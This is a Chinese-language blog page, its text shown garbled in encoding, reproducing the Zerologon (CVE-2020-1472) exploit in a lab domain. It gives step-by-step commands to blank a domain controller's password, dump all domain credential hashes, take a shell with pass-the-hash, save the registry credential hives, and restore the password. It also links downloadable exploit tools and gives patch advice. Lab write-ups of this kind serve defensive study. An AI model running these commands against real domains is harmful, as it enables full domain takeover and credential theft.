
<!DOCTYPE html>
<html lang="zh-Hans">
    <head>
        <meta charset="utf-8" />
        <title>CVE-2020-1472ï¼šZerologonåŸŸæ§ææƒ | å°Câ™¥å¤©å¤©</title>
        <meta name="author" content="å°C&å¤©å¤©" />
        <meta name="description" content="^v^" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
        <link rel="icon" href="/images/icon.jpg" />
        <link rel="preconnect" href="https://cdn.staticfile.org" />
<script src="https://cdn.staticfile.org/vue/3.3.4/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.0/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<!-- å…¼å®¹ä¸åŒç‰ˆæœ¬çš„æµè§ˆå™¨ -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<!-- é«˜äº®ä»£ç  -->
<script src="https://static-argvchs.netlify.app/libs/highlight.js/11.8.0/highlight.min.js"></script>
<script src="https://static-argvchs.netlify.app/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/highlight.js/11.8.0/styles/base16-onedark.min.css" />
<script src="/js/lib/highlight.js"></script>


<!-- ä½¿ç”¨ KaTeX æ¸²æŸ“æ•°å­¦å…¬å¼ -->
<script src="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/katex.min.js"></script>
<script src="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://static-argvchs.netlify.app/libs/KaTeX/0.16.8/katex.min.css" />
<script src="/js/lib/math.js"></script>


<!-- ç®€å•çš„ç‚¹å‡»å›¾ç‰‡æ”¾å¤§ç¼©å°çš„é¢„è§ˆ -->
<script src="/js/lib/preview.js"></script>


<!-- çœ‹æ¿å¨˜ -->
<script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>



<!-- è¯„è®ºè®¾ç½® -->

<script
    src="https://giscus.app/client.js"
    data-repo="A7cc/giscus-comments"
    data-repo-id="R_kgDOKKSvfw"
    data-category="Announcements"
    data-category-id="DIC_kwDOKKSvf84CYyp2"
    data-mapping="pathname"
    data-strict="1"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
    data-lang="zh-CN"
    crossorigin
    async
></script>



<script src="https://static-argvchs.netlify.app/libs/animejs/3.2.1/anime.min.js"></script>
<link rel="stylesheet" href="/css/main.css" />

    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="layout">
            <!-- é¡µé¢åŠ è½½ -->
            <transition name="fade">
                <div id="loading" v-show="loading">
                    <div id="loading-circle">
                        <h2>LOADING</h2>
                        <p>æ­£åœ¨åŠ è½½</p>
                        <img src="/images/afde9fa65a5742a90b51d6e1211e841e.gif" />
                    </div>
                </div>
            </transition>
            <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>å°Câ™¥å¤©å¤©</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;ä¸»é¡µ</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;å…³äº</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;æ–‡ç« </span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;åˆ†ç±»</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;æ ‡ç­¾</span>
        </a>
        
        <a href="/tools">
            <i class="fa-solid fa-tools fa-fw"></i>
            <span>&ensp;å·¥å…·</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;å°Câ™¥å¤©å¤©</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">ä¸»é¡µ</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">å…³äº</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">æ–‡ç« </div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">åˆ†ç±»</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">æ ‡ç­¾</div>
                    </div>
                </a>
                
                <a href="/tools">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tools fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">å·¥å…·</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

            <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
                <div id="article-posts-wrap" true ref="homePostsWrap">
    <div class="article">
        <div>
            <h1>CVE-2020-1472ï¼šZerologonåŸŸæ§ææƒ</h1>
        </div>
        <div class="info">
            <span class="date">
                <span class="icon">
                    <i class="fa-solid fa-calendar fa-fw"></i>
                </span>
                2023/3/14
            </span>
            
            <span class="category">
                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                    <span class="icon">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </span>
                    æ¼æ´å¤ç°
                </a>
            </span>
            
            
            <span class="tags">
                <span class="icon">
                    <i class="fa-solid fa-tags fa-fw"></i>
                </span>
                
                
                <span class="tag">
                    
                    <a href="/tags/%E6%8F%90%E6%9D%83/" style="color: #00bcd4">ææƒ</a>
                </span>
                
                <span class="tag">
                    
                    <a href="/tags/%E5%9F%9F/" style="color: #03a9f4">åŸŸ</a>
                </span>
                
            </span>
            
        </div>
        
        <div class="content" v-pre>
            <h1 id="å£¹-æ¼æ´æ¦‚å¿µ"><a href="#å£¹-æ¼æ´æ¦‚å¿µ" class="headerlink" title="å£¹ æ¼æ´æ¦‚å¿µ"></a>å£¹ æ¼æ´æ¦‚å¿µ</h1><p>CVE-2020-1472 æ˜¯â¼€ä¸ªWindowsåŸŸæ§ä¸­ä¸¥é‡çš„è¿œç¨‹æƒé™æå‡æ¼æ´ï¼Œè¯¥æ¼æ´ä¹Ÿç§°ä¸ºâ€œZerologonâ€ï¼ŒCVSSè¯„åˆ†ä¸º10.0ï¼Œå·ç§°3ç§’æ’¸ç©¿åŸŸæ§ï¼Œå±å®³ä¸¥é‡ã€‚</p>
<span id="more"></span>
<h1 id="è´°-æ¼æ´åŸç†åŠåˆ©ç”¨æ¡ä»¶"><a href="#è´°-æ¼æ´åŸç†åŠåˆ©ç”¨æ¡ä»¶" class="headerlink" title="è´° æ¼æ´åŸç†åŠåˆ©ç”¨æ¡ä»¶"></a>è´° æ¼æ´åŸç†åŠåˆ©ç”¨æ¡ä»¶</h1><p>CVE-2020-1472 æ˜¯â¼€ä¸ªWindowsåŸŸæ§ä¸­ä¸¥é‡çš„è¿œç¨‹æƒé™æå‡æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ NetLogonï¼ˆMS-NRPCï¼‰åè®®ä¸ADåŸŸæ§å»ºç«‹å®‰å…¨é€šé“æ—¶ï¼Œå¯åˆ©â½¤æ­¤æ¼æ´å°†åŸŸæ§ä¸­ä¿å­˜åœ¨ADä¸­çš„ç®¡ç†å‘˜passwordè®¾ç½®ä¸ºç©ºï¼Œè·å–åŸŸç®¡è®¿é—®æƒé™ï¼›å…¶æ¼æ´åŸç†æ˜¯å‘â½£åœ¨ RPC è®¤è¯è¿‡ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œç”±äºé”™è¯¯çš„ä½¿â½¤äº† AES-CFB8 åŠ å¯†æ‰€å¯¼è‡´æ¼æ´æˆå› ã€‚</p>
<p><font color="red">æ³¨æ„ï¼šåœ¨å®æˆ˜ç¯å¢ƒä¸­ï¼Œç”±äºä¼šæŠŠåŸŸæ§æœºå™¨çš„è´¦æˆ·å’Œå¯†ç æ¸…ç©ºï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šå¯¼è‡´åŸŸå†…å‡ºé—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´æŸäº›æœåŠ¡â½†æ³•æ­£å¸¸è¿â¾ï¼Œä¸¥é‡ä¼šé€ æˆè„±åŸŸç­‰æƒ…å†µï¼Œè¯·è°¨æ…åˆ©â½¤ã€‚</font></p>
<h1 id="å-é€‚ç”¨ç‰ˆæœ¬"><a href="#å-é€‚ç”¨ç‰ˆæœ¬" class="headerlink" title="å é€‚ç”¨ç‰ˆæœ¬"></a>å é€‚ç”¨ç‰ˆæœ¬</h1><p>è¯¥æ¼æ´é€‚â½¤äº Win2008 åçš„æ‰€æœ‰ç‰ˆæœ¬ã€‚</p>
<pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
</code></pre>
<h1 id="è‚†-å¤ç°ç¯å¢ƒè¯´æ˜"><a href="#è‚†-å¤ç°ç¯å¢ƒè¯´æ˜" class="headerlink" title="è‚† å¤ç°ç¯å¢ƒè¯´æ˜"></a>è‚† å¤ç°ç¯å¢ƒè¯´æ˜</h1><p>åŸŸæ§ï¼š<code>windows server 2019 Essentialsï¼ˆ10.0.10.110ï¼‰</code>ï¼Œå¼€å¯é˜²ç«å¢™<br>åŸŸæ§ï¼š<code>windows server 2016 Datacenterï¼ˆ10.0.10.111ï¼‰</code><br>åŸŸåï¼š<code>vulntarget.com</code></p>
<p>åˆ©ç”¨åœºæ™¯ï¼šè·å–äº†ä¸€ä¸ªåŠ å…¥äº†åŸŸçš„è®¡ç®—æœºæƒé™ï¼Œåœ¨åŸŸæ™®é€šè´¦å·çš„æƒ…å†µä¸‹ï¼Œå°†åŸŸç®¡å¯†ç ç½®ç©ºï¼Œå¯¼å‡ºåŸŸç®¡hashï¼Œç„¶åè¿›è¡Œè¿æ¥ã€‚</p>
<h1 id="ä¼-å¤ç°"><a href="#ä¼-å¤ç°" class="headerlink" title="ä¼ å¤ç°"></a>ä¼ å¤ç°</h1><h2 id="5-1-CVE-2020-1472å¤ç°"><a href="#5-1-CVE-2020-1472å¤ç°" class="headerlink" title="5.1 CVE-2020-1472å¤ç°"></a>5.1 CVE-2020-1472å¤ç°</h2><pre><code># ä½¿ç”¨ä¸‹é¢å‘½ä»¤è·å–åŸŸæ§
net group &quot;domain controllers&quot; /domain
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/4060619e1bf49150f8d5bdf4e05aa298.png" alt="4060619e1bf49150f8d5bdf4e05aa298.png"></p>
<p>ä½¿ç”¨<code>zerologon_tester.py</code>æ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼ˆè¿™ä¸ªæ¼æ´æœ€å¥½å…ˆæ£€æµ‹ä¸€ä¸‹ï¼Œå› ä¸ºç›´æ¥ä½¿ç”¨EXPä¼šå¯¼è‡´åŸŸç®¡ç½®ç©ºï¼‰</p>
<pre><code>python zerologon_tester.py åŸŸæ§ä¸»æœºå åŸŸæ§ip
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/dff26a18b9691054d661fc9cdedac400.png" alt="dff26a18b9691054d661fc9cdedac400.png"><br>è¿™é‡Œç”¨çš„æ˜¯å†…ç½‘ç¯å¢ƒï¼Œæ‰€ä»¥åŠ äº†<code>proxychains4</code>è¿›è¡Œä»£ç†ï¼Œæœ€åè¾“å‡ºï¼š<br><img src="/images/%E5%A4%8D%E7%8E%B0/821ab6ae6386d5ec67c2b91d9a707470.png" alt="821ab6ae6386d5ec67c2b91d9a707470.png"><br>è¿”å› Successï¼Œè¯´æ˜æ¼æ´å¾ˆå¯èƒ½å­˜åœ¨ï¼</p>
<p>æ¥ç€ä½¿ç”¨å·¥å…·<code>cve-2020-1472-exploit.py</code>ï¼Œç½®ç©ºDCå¯†ç ï¼š</p>
<pre><code>python3 cve-2020-1472-exploit.py åŸŸæ§ä¸»æœºå åŸŸæ§ip
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/e0b8b3f98e6326998ee586ee63cb5152.png" alt="e0b8b3f98e6326998ee586ee63cb5152.png"><br>æœ€åä½¿ç”¨<code>secretsdum.py</code>ï¼ˆè¯¥æ”»å‡»åœ¨<code>impacket-master/examples/</code>ä¸‹ï¼‰å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯ï¼Œå› ä¸ºç½®ç©ºäº†å¯†ç ï¼Œæ‰€ä»¥è¿™é‡Œæ— éœ€å¯†ç å°±èƒ½å¯¼å‡ºhashï¼š</p>
<pre><code># éœ€è¦æ³¨æ„è¿™é‡Œæ ¼å¼æ˜¯åŸŸå/åŸŸæ§ä¸»æœºå\$@åŸŸæ§ip
# éœ€è¦å°†impacket-masterçš„æ‰€æœ‰çš„åº“ä¸‹è½½ï¼Œå¦åˆ™å¯èƒ½æŠ¥é”™
python3 secretsdump.py åŸŸå/åŸŸæ§ä¸»æœºå\$@åŸŸæ§ip -no-pass
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/5c022167b6bd693248b5f35ef354b15e.png" alt="5c022167b6bd693248b5f35ef354b15e.png"></p>
<p>æœ€æœ€åä½¿ç”¨<code>smbexec.py</code>ï¼ˆè¯¥æ”»å‡»åœ¨<code>impacket-master/examples/</code>ä¸‹ï¼‰ï¼Œè·å¾—åŸŸæ§ç»ˆç«¯ï¼š</p>
<pre><code>python3 wmiexec.py -hashes hashå€¼ åŸŸæ§ç”¨æˆ·å@åŸŸæ§ip
# å½“ç„¶ä¹Ÿå¯ä»¥ç”¨smbexec.pyã€psexec.py
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/cbb9ea3939abedd4e80b7bf5c614f8f7.png" alt="cbb9ea3939abedd4e80b7bf5c614f8f7.png"></p>
<h2 id="5-2-æ¢å¤åŸŸæ§åŸå§‹hash"><a href="#5-2-æ¢å¤åŸŸæ§åŸå§‹hash" class="headerlink" title="5.2 æ¢å¤åŸŸæ§åŸå§‹hash"></a>5.2 æ¢å¤åŸŸæ§åŸå§‹hash</h2><p>å¯¼å‡º <code>sam system</code> ç­‰â½‚ä»¶åˆ°æœ¬åœ°ï¼Œè·å–åŸŸæ§æœºå™¨ä¸Šæœ¬åœ°ä¿å­˜ä¹‹å‰çš„ <code>hash</code> å€¼â½¤äºæ¢å¤ï¼Œä¸ç„¶å°±è„±åŸŸäº†ï¼š</p>
<pre><code>reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/a8de7b60140686400c23d827e4279612.png" alt="a8de7b60140686400c23d827e4279612.png"><br>ç„¶åå°†è¿™ä¸‰ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼ˆå‡è®¾å·²ç»ä¸‹è½½ä¸‹æ¥äº†ï¼‰ï¼Œåˆ é™¤æ–‡ä»¶ï¼š</p>
<pre><code>del /f system.save
del /f sam.save
del /f security.save
</code></pre>
<p>ä¹‹åé€šè¿‡<code>sam.save</code>ã€<code>security.save</code>ã€<code>system.save</code>è¿™äº›â½‚ä»¶è·å¾—åŸæ¥åŸŸæ§æœºå™¨ä¸Šçš„<code>Ntlm Hash</code>å€¼ï¼Œâ½¤äºæ¢å¤å¯†ç ï¼Œåœ¨kaliä¸Šè¿è¡Œ<code>secretsdump.py</code>è„šæœ¬ï¼ˆè¯¥æ”»å‡»åœ¨<code>impacket-master/examples/</code>ä¸‹ï¼‰ï¼š</p>
<pre><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/265fe16451d6df542910d0ed24eb5a6f.png" alt="265fe16451d6df542910d0ed24eb5a6f.png"><br>æˆ‘ä»¬è·å¾—äº†<code>$MACHINE.ACC:</code>çš„å€¼ï¼Œç„¶åä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py"><code>reinstall_original_pw.py</code></a>è¿›â¾æ¢å¤ï¼š</p>
<pre><code># éœ€è¦æ³¨æ„è¿™é‡Œæœ€åçš„å‚æ•°è¦çš„æ˜¯$MACHINE.ACCååŠéƒ¨åˆ†çš„å€¼
# ä¾‹å¦‚ä¾‹å­ä¸­çš„$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:927882c9c7f9a92e8aa7d385ec0f2023
# å–927882c9c7f9a92e8aa7d385ec0f2023è¿™ä¸€æ®µ
python3 reinstall_original_pw.py åŸŸæ§æœºå™¨å åŸŸæ§ip $MACHINE.ACCååŠéƒ¨åˆ†çš„å€¼
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/3913ccff4f3d0becad8c8643dbdbea98.png" alt="3913ccff4f3d0becad8c8643dbdbea98.png"><br><img src="/images/%E5%A4%8D%E7%8E%B0/7d3fb1f0acdc1443118fd8e8f1facec5.png" alt="7d3fb1f0acdc1443118fd8e8f1facec5.png"><br><font color="red">æ³¨æ„ï¼šè¿™é‡ŒåŸŸæ§æœºå™¨åä¸èƒ½åŠ $ï¼Œæ˜¾ç¤ºäº†successä¹Ÿä¸ä¸€å®šæˆåŠŸï¼Œéœ€è¦ç”¨è„šæœ¬éªŒè¯ä¸€ä¸‹ï¼</font></p>
<p>åœ¨ä½¿ç”¨å¼€å§‹çš„<code>secretsdum.py</code>å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯ï¼Œå¯è§ä½¿ç”¨ç©ºå¯†ç å»è·å–åŸŸå†…çš„æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯å·²ç»ä¸è¡Œäº†ï¼š</p>
<pre><code>python3 secretsdump.py åŸŸå/åŸŸæ§ä¸»æœºå\$@åŸŸæ§ip -no-pass
</code></pre>
<p><img src="/images/%E5%A4%8D%E7%8E%B0/08740de7447934110756b64075de97bf.png" alt="08740de7447934110756b64075de97bf.png"></p>
<p><font color="red">æ³¨æ„ï¼šåˆ«åœ¨å®æˆ˜ä¸­é‡ç½®äº†åŸŸæ§çš„å¯†ç ä¸ºç©ºï¼Œç»“æœä¸ä¼šè¿˜åŸå¯¼è‡´ç›®æ ‡è„±åŸŸäº†ï¼Œå°±BBQäº†ï¼ï¼ï¼ï¼</font></p>
<h1 id="é™†-åˆ©ç”¨Poc-Expä»¥åŠå·¥å…·"><a href="#é™†-åˆ©ç”¨Poc-Expä»¥åŠå·¥å…·" class="headerlink" title="é™† åˆ©ç”¨Poc|Expä»¥åŠå·¥å…·"></a>é™† åˆ©ç”¨Poc|Expä»¥åŠå·¥å…·</h1><p><a href="/tools/%E5%A4%8D%E7%8E%B0/CVE-2020-1472%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83.zip">CVE-2020-1472åŸŸæ§ææƒ.zip</a><br><a href="/tools/%E5%A4%8D%E7%8E%B0/impacket%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%B7%A5%E5%85%B7%E5%8C%85impacket.zip">impacketç½‘ç»œåè®®å·¥å…·åŒ…impacket.zip</a><br><a href="/tools/%E5%A4%8D%E7%8E%B0/reinstall_original_pw.py">reinstall_original_pw.py</a></p>
<h1 id="æŸ’-å±å®³"><a href="#æŸ’-å±å®³" class="headerlink" title="æŸ’ å±å®³"></a>æŸ’ å±å®³</h1><p>CVSSè¯„åˆ†ä¸º10.0ï¼Œå·ç§°3ç§’æ’¸ç©¿åŸŸæ§ï¼Œå±å®³ä¸¥é‡ã€‚</p>
<h1 id="æŒ-ä¿®å¤å»ºè®®"><a href="#æŒ-ä¿®å¤å»ºè®®" class="headerlink" title="æŒ ä¿®å¤å»ºè®®"></a>æŒ ä¿®å¤å»ºè®®</h1><p>å»ºè®®ç‚¹å‡»ä»¥ä¸‹é“¾æ¥è‡ªè¡Œå¯»æ‰¾ç¬¦åˆæ“ä½œç³»ç»Ÿç‰ˆæœ¬çš„æ¼æ´è¡¥ä¸ï¼Œå¹¶è¿›è¡Œè¡¥ä¸ä¸‹è½½å®‰è£…ã€‚</p>
<pre><code>https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472
</code></pre>
<h1 id="ç–-å‚è€ƒ"><a href="#ç–-å‚è€ƒ" class="headerlink" title="ç– å‚è€ƒ"></a>ç– å‚è€ƒ</h1><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhwfa/article/details/123497241">CVE-2020-1472åŸŸå†…ææƒæ¼æ´</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/123566796">åŸŸå†…ææƒä¹‹CVE-2020-1472å¤ç°æ‰“åŸŸæ§</a></li>
</ul>

        </div>
        
        
        <div id="comment">
            <div id="giscus-container" class="giscus"></div>
        </div>
        
    </div>
    
    <div id="article-card">
        <div id="card-style">
    <div id="card-div" class="card-cls">
        <div class="avatar">
            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg" alt="avatar" />
        </div>
        <div class="name">å°C&amp;å¤©å¤©</div>
        <div class="description">
            <p>ä¿®å­¦å‚¨èƒ½ å…ˆåšåæ¸Š</p>

        </div>
        
        <div class="icon-links">
            
            <span class="icon-link">
                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
                    <i class="fa-brands fa-github fa-fw"></i>
                </a>
            </span>
            
            <span class="icon-link">
                <a target="_blank" rel="noopener" href="https://www.qq.com/">
                    <i class="fa-brands fa-qq fa-fw"></i>
                </a>
            </span>
            
            <span class="icon-link">
                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
                    <i class="fa-brands fa-weibo fa-fw"></i>
                </a>
            </span>
            
            <span class="icon-link">
                <a target="_blank" rel="noopener" href="https://google.com/">
                    <i class="fa-brands fa-google fa-fw"></i>
                </a>
            </span>
            
        </div>
        
        
        <div class="friend-links">
            
            <span class="friend-link">
                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">kyrieee</a>
            </span>
            
            <span class="friend-link">
                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">tonyd0g</a>
            </span>
            
            <span class="friend-link">
                <a target="_blank" rel="noopener" href="https://ruyueattention.github.io/">ruyueattention</a>
            </span>
            
        </div>
        
    </div>
    
    <!-- <br /> -->
    <!-- ç›®å½• -->
    <!-- 
    <div id="card-div">
        <div id="toc" class="toc-article">
            <strong class="toc-title">æ–‡ç« ç›®å½•</strong>
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5"><span class="toc-text">å£¹ æ¼æ´æ¦‚å¿µ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">è´° æ¼æ´åŸç†åŠåˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC"><span class="toc-text">å é€‚ç”¨ç‰ˆæœ¬</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%82%86-%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"><span class="toc-text">è‚† å¤ç°ç¯å¢ƒè¯´æ˜</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%8D-%E5%A4%8D%E7%8E%B0"><span class="toc-text">ä¼ å¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-CVE-2020-1472%E5%A4%8D%E7%8E%B0"><span class="toc-text">5.1 CVE-2020-1472å¤ç°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E6%81%A2%E5%A4%8D%E5%9F%9F%E6%8E%A7%E5%8E%9F%E5%A7%8Bhash"><span class="toc-text">5.2 æ¢å¤åŸŸæ§åŸå§‹hash</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%86-%E5%88%A9%E7%94%A8Poc-Exp%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="toc-text">é™† åˆ©ç”¨Poc|Expä»¥åŠå·¥å…·</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%92-%E5%8D%B1%E5%AE%B3"><span class="toc-text">æŸ’ å±å®³</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8D%8C-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">æŒ ä¿®å¤å»ºè®®</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%96-%E5%8F%82%E8%80%83"><span class="toc-text">ç– å‚è€ƒ</span></a></li></ol>
        </div>    
    </div>
     -->
</div>

<div id="card-style-fun">
    
    <br />
    <!-- ä»Šæ—¥è¯—å¥ -->
    <div id="card-div">
        <div class="good-sentence">
            <div class="toolio">
                <div class="circle"><span class="red"></span></div>
                <div class="circle"><span class="yellow"></span></div>
                <div class="circle"><span class="green"></span></div>
                <div class="circle"><span class="text">ä»Šæ—¥è¯—å¥</span></div>
            </div>
            <div class="sentence">
                <div id="sentenceid" onload="getsentence();"></div>
            </div>
        </div>
    </div>
    <br />
    <!-- æ—¥æœŸä¿¡æ¯ -->
    <div id="card-div">
        <img src="//api.vvhan.com/api/ipCard?tip=A7cc" width="300" height="180">
    </div>
    
</div>



    </div>
    
</div>
                <!-- é¡µè„š -->
                <footer id="footer">
    <div id="footer-wrap">
        <div>
            <span id="timeDate">è½½å…¥å¤©æ•°...</span><span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
            <script>
                var now = new Date(); 
                function createtime() { 
                    var grt= new Date("07/10/2022 00:00:00");
                    now.setTime(now.getTime()+250); 
                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
                    document.getElementById("timeDate").innerHTML = "å·²è¿è¡Œ "+dnum+" å¤© "; 
                    document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"; 
                } 
            setInterval("createtime()",250);
            </script>
        </div>
        <div>
            &copy;
            2022 - 2023 å°Câ™¥å¤©å¤©
            <span class="footer-icon">
                <i class="fa-brands fa-github fa-fw"></i>
            </span>
            &commat;å°C&amp;å¤©å¤©
        </div>
        <div>
            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a> 
        </div>
        
    </div>
</footer>

            </div>
            <!-- ç®€å•çš„ç‚¹å‡»å›¾ç‰‡æ”¾å¤§ç¼©å°çš„é¢„è§ˆ -->
            
            <div name="fade">
                <div id="preview" ref="preview" v-show="previewShow">
                    <img id="preview-content" ref="previewContent" />
                </div>
            </div>
            
        </div>
        <!-- çœ‹æ¿å¨˜ -->
        
        <div id="L2dCanvas"></div>
        <script src="/js/lib/live2d.min.js"></script>
